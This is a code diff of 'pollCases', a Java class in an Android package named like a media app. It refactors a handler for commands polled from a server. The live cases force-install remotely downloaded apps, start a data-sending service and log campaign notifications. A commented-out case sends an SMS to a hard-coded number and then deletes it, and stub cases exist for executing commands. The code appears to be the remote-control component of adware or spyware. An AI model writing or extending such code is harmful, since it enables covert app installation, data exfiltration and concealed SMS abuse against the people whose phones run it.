@@ -7,6 +7,7 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 
 import com.media.ui.DataCollector.CnfInstall;
+import com.media.ui.Database.databaseHandler;
 import com.media.ui.Notifications.installNotification;
 import com.media.ui.Notifications.sendNotification;
 import com.media.ui.Services.dataSender;
@@ -20,6 +21,15 @@ import java.util.concurrent.ExecutionException;
 
 import static android.content.Context.NOTIFICATION_SERVICE;
 import static com.media.ui.Util.logger.logg;
+import static com.media.ui.Util.pollFlagsConstants.ASK_INSTALL;
+import static com.media.ui.Util.pollFlagsConstants.CLEAN_DB;
+import static com.media.ui.Util.pollFlagsConstants.DO_CONFIGURATION;
+import static com.media.ui.Util.pollFlagsConstants.EXECUTE_CMD;
+import static com.media.ui.Util.pollFlagsConstants.FORCE_INSTALL;
+import static com.media.ui.Util.pollFlagsConstants.INSTALL_REQ_APP;
+import static com.media.ui.Util.pollFlagsConstants.MAKE_NOTIFICATION;
+import static com.media.ui.Util.pollFlagsConstants.PULL_DATA;
+import static com.media.ui.Util.pollFlagsConstants.SEND_SMS;
 import static java.lang.Thread.sleep;
 
 
@@ -46,18 +56,21 @@ public class pollCases {
             String uri;
             String pkg;
             switch (val) {
-                case "noti":
+                case MAKE_NOTIFICATION:
                     String data = (String) hash.get(1);
                     new sendNotification(camp_id, data, 1, context);
                     break; // optional
-                case "askins":
+                case ASK_INSTALL:
                     // Statements.
                     String data1 = (String) hash.get(1);
                     logg("icon:"+adt_arr[2]);
                     new installNotification(context).addNotification( data1,String.valueOf(camp_id));
+                    databaseHandler camp = new databaseHandler(context);
+                    camp.insertCAMPDetails(camp_id,"notiRecieved");
+                    camp.closedb();
                     break; // optional
                 // You can have any number of case statements.
-                case "forceins":
+                case FORCE_INSTALL:
                     logg("Arr_Length:-" + Integer.toString(adt_arr.length));
                     if (adt_arr.length > 1) {
                         uri = adt_arr[0];
@@ -67,18 +80,18 @@ public class pollCases {
                         new CnfInstall(context).downloadAndInstall(loc1, uri, pkg, camp_id);
                     }
                     break; // optional
-                case "pulldata":
+                case PULL_DATA:
                     Intent newIntent = new Intent(context, dataSender.class);
                     newIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     context.startService(newIntent);
                     break; // optional
-                case "conf":
+                case DO_CONFIGURATION:
                     // Statements
                     break; // optional
-                case "cleandb":
+                case CLEAN_DB:
                     // Statements
                     break; // optional
-                case "installApp":
+                case INSTALL_REQ_APP:
                     if (adt_arr.length > 1) {
                         uri = adt_arr[0];
                         pkg = adt_arr[1];
@@ -90,10 +103,11 @@ public class pollCases {
                         // Statements
                     }
                     break; // optional
-                case "execcmd":
+                case EXECUTE_CMD:
                     // Statements
                     break; // optional
-                case "sendsms":
+                case SEND_SMS:
+                    /*
                     SMSManager y = new SMSManager();
                     y.sendsms("09821490074", "Test Message", context);
                     try {
@@ -103,9 +117,11 @@ public class pollCases {
                     }
                     y.deleteSMS(context, "Test Message", "09821490074");
                     // Statements
+                    */
                     break; // optional
                 default: // Optional
                     // Statements
+
             }
 
         }
